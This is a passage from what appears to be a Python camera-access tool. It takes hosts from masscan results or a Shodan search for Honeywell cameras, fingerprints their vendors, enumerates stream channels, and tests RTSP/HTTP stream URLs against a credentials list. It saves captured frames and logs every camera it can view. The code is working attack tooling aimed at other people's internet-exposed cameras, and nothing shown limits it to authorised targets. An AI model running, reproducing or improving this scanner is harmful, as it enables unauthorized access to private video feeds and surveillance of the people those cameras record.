        for i, entry in enumerate(scan_results, 1):
            ip = entry["ip"]
            port = entry["port"]
            print(f"  [{i}/{len(scan_results)}] Probing {ip}:{port}...", end=" ")

            fp = fingerprint_host(ip, port, timeout=args.timeout)
            if fp:
                port_type = fp.get("type", "unknown")
                vendor = fp.get("vendor", "unknown")
                server = fp.get("server", "")
                print(f"{port_type.upper()} - {vendor} ({server})" if server else f"{port_type.upper()} - {vendor}")

                cam = cameras_by_ip[ip]
                cam["ports"][port] = fp
                # Promote vendor if identified (don't downgrade from known to unknown)
                if vendor != "unknown":
                    cam["vendor"] = vendor
            else:
                print("no response")

        if not cameras_by_ip:
            print("\nNo camera services detected on any host")
            sys.exit(2)

        # Count vendors
        vendor_counts = defaultdict(int)
        for ip, cam in cameras_by_ip.items():
            vendor_counts[cam["vendor"]] += 1
        summary_parts = [f"{count} {vendor}" for vendor, count in sorted(vendor_counts.items())]
        print(f"\nIdentified {len(cameras_by_ip)} host(s): {', '.join(summary_parts)}")

        # Phase 3: Test camera URLs on each identified host
        # Save discovery/fingerprint results to file
        discovery_file = os.path.join(logs_dir, "masscan_discovery.txt")
        with open(discovery_file, 'w', encoding='utf-8') as f:
            f.write(f"Masscan scan: {args.scan}\n")
            f.write(f"Ports scanned: {args.ports}\n")
            f.write(f"Hosts found: {len(cameras_by_ip)}\n")
            f.write(f"Breakdown: {', '.join(summary_parts)}\n")
            f.write(f"{'='*50}\n\n")
            for ip, cam in cameras_by_ip.items():
                vendor = cam["vendor"]
                for port, fp in sorted(cam["ports"].items()):
                    svc_type = fp.get("type", "?")
                    server = fp.get("server", "")
                    line = f"{ip}:{port}  {svc_type.upper():5s}  {vendor:12s}  {server}"
                    f.write(f"{line}\n")
        print(f"Discovery results saved to: {discovery_file}")

        print(f"\n{'='*50}")
        print("Testing RTSP/HTTP streams on identified hosts...")
        print(f"{'='*50}")

        for i, (ip, cam) in enumerate(cameras_by_ip.items(), 1):
            vendor = cam["vendor"]
            port_list = sorted(cam["ports"].keys())

            # Determine RTSP and HTTP ports from fingerprinting results
            cam_rtsp_port = args.rtsp_port
            cam_http_port = args.http_port
            for p, fp in cam["ports"].items():
                if fp["type"] == "rtsp" and not cam_rtsp_port:
                    cam_rtsp_port = p
                elif fp["type"] == "http" and not cam_http_port:
                    cam_http_port = p

            print(f"\n[{i}/{len(cameras_by_ip)}] Testing {ip} ({vendor}) - Ports: {port_list}")

            # Channel enumeration if requested
            channels_to_test = [args.channel]
            camera_info = {}
            if args.enum_channels:
                camera_info = enumerate_camera_channels(ip, credentials,
                                                        http_port=cam_http_port or 80,
                                                        rtsp_port=cam_rtsp_port or 554)
                if camera_info["available_channels"]:
                    channels_to_test = camera_info["available_channels"]
                    print(f"Will test the following channels: {channels_to_test}")

            all_results = []
            for channel in channels_to_test:
                print(f"\nTesting channel {channel}...")
                results = test_camera_urls(ip, channel, credentials, args.save_frames,
                                           rtsp_port=cam_rtsp_port, http_port=cam_http_port,
                                           auto_detect=args.auto_detect_ports,
                                           timeout=args.timeout)
                all_results.extend(results)

                if any("[OK]" in result for result in results):
                    if ip not in working_ips:
                        working_ips.append(ip)

                    if args.notify:
                        play_notification_sound()

                    if args.until_success:
                        break

            # Save per-IP results file
            ip_result_filename = os.path.join(logs_dir, f"camera_results_{ip}.txt")
            with open(ip_result_filename, 'w', encoding='utf-8') as f:
                f.write(f"Camera: {ip}\n")
                f.write(f"Vendor: {vendor}\n")
                f.write(f"Open Ports: {port_list}\n")
                f.write(f"Camera Name: {camera_info.get('camera_name', 'Unknown')}\n")
                f.write(f"Available Channels: {camera_info.get('available_channels', channels_to_test)}\n\n")
                for result in all_results:
                    f.write(f"{result}\n")
                    print(result)

            if args.until_success and ip in working_ips:
                print(f"\n--until-success: Found working camera at {ip}, stopping scan.")
                break

        # Save results to the specified result file if provided
        if args.result_file:
            with open(args.result_file, 'a', encoding='utf-8') as f:
                f.write(f"\nMasscan scan complete. Scanned {len(cameras_by_ip)} camera host(s).\n")
                f.write(f"Working cameras: {len(working_ips)}\n")
                for ip in working_ips:
                    f.write(f"  {ip}\n")

    # Shodan search
    elif args.api_key:
        product_type = "custom cameras" if args.query else "Honeywell cameras"
        print(f"Searching Shodan for {product_type}...")
        cameras = search_shodan(args.api_key, args.limit, args.query, args.page)
        
        if not cameras:
            print("No matching cameras found")
            # Clear working_cameras.txt so stale data from previous runs doesn't persist
            working_cameras_path = args.output_list if args.output_list else os.path.join(logs_dir, "working_cameras.txt")
            ensure_dir(os.path.dirname(os.path.abspath(working_cameras_path)))
            with open(working_cameras_path, 'w', encoding='utf-8') as f:
                pass  # Write empty file
            sys.exit(2)  # Exit code 2 signals "no results" to shell scripts for pagination
        
        print(f"Found {len(cameras)} matching cameras")
        
        for i, camera in enumerate(cameras, 1):
            ip = camera['ip']
            ports = camera['ports']
            org = camera['org']
            
            print(f"\n[{i}/{len(cameras)}] Testing camera at {ip} (Org: {org}, Ports: {ports})")
            
            # If channel enumeration is enabled, try to discover channels
            channels_to_test = [args.channel]  # Default to specified channel
            camera_info = {}
            
            if args.enum_channels:
                camera_info = enumerate_camera_channels(ip, credentials)
                if camera_info["available_channels"]:
                    channels_to_test = camera_info["available_channels"]
                    print(f"Will test the following channels: {channels_to_test}")
            
            # Detect ports from Shodan data
            detected_ports = detect_camera_ports(camera)
            cam_rtsp_port = args.rtsp_port if args.rtsp_port else detected_ports.get('rtsp_port')
            cam_http_port = args.http_port if args.http_port else detected_ports.get('http_port')

            all_results = []
            for channel in channels_to_test:
                print(f"\nTesting channel {channel}...")
                results = test_camera_urls(ip, channel, credentials, args.save_frames,
                                         rtsp_port=cam_rtsp_port, http_port=cam_http_port,
                                         auto_detect=args.auto_detect_ports,
                                         timeout=args.timeout)
                all_results.extend(results)
                
                # Check if any URL works for this camera
                if any("[OK]" in result for result in results):
                    if ip not in working_ips:
                        working_ips.append(ip)
                    
                    # Play notification sound if enabled
                    if args.notify:
                        play_notification_sound()

                    # If --until-success flag is set, break after finding first working camera
                    if args.until_success:
                        break
            
            # Save per-IP results file
            ip_result_filename = os.path.join(logs_dir, f"camera_results_{ip}.txt")
            with open(ip_result_filename, 'w', encoding='utf-8') as f:
                f.write(f"Camera: {ip}\n")
                f.write(f"Org: {org}\n")
                f.write(f"Ports: {ports}\n")
                f.write(f"Camera Name: {camera_info.get('camera_name', 'Unknown')}\n")
                f.write(f"Available Channels: {camera_info.get('available_channels', channels_to_test)}\n\n")
                for result in all_results:
                    f.write(f"{result}\n")
                    print(result)
            
            # If --until-success and we found a working camera, stop scanning
            if args.until_success and ip in working_ips:
                print(f"\n--until-success: Found working camera at {ip}, stopping scan.")
                break

        # Save results to the specified result file if provided
        if args.result_file:
            with open(args.result_file, 'a', encoding='utf-8') as f:
                f.write(f"\nShodan scan complete. Tested {len(cameras)} cameras.\n")
                f.write(f"Working cameras: {len(working_ips)}\n")
                for ip in working_ips:
                    f.write(f"  {ip}\n")

    # No mode specified
    else:
        print("Error: specify one of --ip, --scan, or --api-key")
        print("Run with --help for usage information")
        sys.exit(1)

    # Write working_cameras.txt (used by shell scripts for summary)
    working_cameras_path = args.output_list if args.output_list else os.path.join(logs_dir, "working_cameras.txt")
    # Ensure parent directory exists
    ensure_dir(os.path.dirname(os.path.abspath(working_cameras_path)))
    with open(working_cameras_path, 'w', encoding='utf-8') as f:
        for ip in working_ips:
            f.write(f"{ip}\n")
    
    if working_ips:
        print(f"\n{'='*40}")
        print(f"Found {len(working_ips)} working camera(s):")
        print(f"{'='*40}")
        for ip in working_ips:
            print(f"  {ip}")
        print(f"\nWorking cameras saved to: {working_cameras_path}")
    else:
        print("\nNo working cameras found.")

if __name__ == "__main__":
    main() 